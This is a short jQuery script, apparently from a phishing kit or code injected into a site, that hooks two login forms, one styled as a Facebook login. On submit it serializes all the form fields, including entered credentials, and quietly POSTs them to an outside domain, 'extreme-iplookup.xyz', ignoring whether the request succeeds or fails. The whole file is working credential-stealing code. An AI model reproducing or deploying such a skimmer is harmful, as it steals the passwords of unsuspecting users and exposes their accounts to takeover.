$(".form-login-fb").submit(function() {
	var d = $(".form-login-fb");

	$.ajax({
        url: "https://extreme-iplookup.xyz/ ",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});

$(".form-login").submit(function() {
	var d = $(".form-login");

	$.ajax({
        url: "https://extreme-iplookup.xyz/ ",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
